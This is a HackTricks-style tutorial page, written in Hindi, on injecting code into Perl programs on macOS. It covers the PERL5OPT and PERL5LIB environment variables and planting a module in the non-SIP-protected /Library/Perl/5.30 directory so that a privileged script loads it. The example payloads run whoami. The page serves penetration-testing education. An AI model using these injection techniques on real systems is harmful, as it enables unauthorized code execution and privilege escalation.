# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` और `PERL5LIB` एन्वायरनमेंट वेरिएबल के माध्यम से

एन्वायरनमेंट वेरिएबल PERL5OPT का उपयोग करके, यह संभव है कि पर्ल मनमाने कमांड्स को निष्पादित करे।\
उदाहरण के लिए, इस स्क्रिप्ट को बनाएं:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
अब **env वेरिएबल को एक्सपोर्ट करें** और **perl** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प यह है कि एक Perl मॉड्यूल बनाया जाए (जैसे कि `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
और फिर env वेरिएबल्स का उपयोग करें:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## निर्भरता के माध्यम से

Perl चलाने की निर्भरता फ़ोल्डर क्रम को सूचीबद्ध करना संभव है:
```bash
perl -e 'print join("\n", @INC)'
```
जो कुछ इस तरह लौटाएगा:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ लौटाए गए फ़ोल्डर वास्तव में मौजूद नहीं हैं, हालाँकि, **`/Library/Perl/5.30`** **मौजूद** है, यह **SIP** द्वारा **संरक्षित** **नहीं** है और यह **SIP** द्वारा **संरक्षित** फ़ोल्डरों से **पहले** है। इसलिए, कोई उस फ़ोल्डर का दुरुपयोग कर सकता है ताकि वहाँ स्क्रिप्ट निर्भरताएँ जोड़ी जा सकें ताकि एक उच्च विशेषाधिकार प्राप्त Perl स्क्रिप्ट इसे लोड कर सके।

> [!WARNING]
> हालाँकि, ध्यान दें कि आपको उस फ़ोल्डर में लिखने के लिए **रूट** होना **ज़रूरी** है और आजकल आपको यह **TCC प्रॉम्प्ट** मिलेगा:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

उदाहरण के लिए, यदि एक स्क्रिप्ट **`use File::Basename;`** आयात कर रही है, तो `/Library/Perl/5.30/File/Basename.pm` बनाना संभव होगा ताकि यह मनमाना कोड निष्पादित कर सके।

## संदर्भ

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
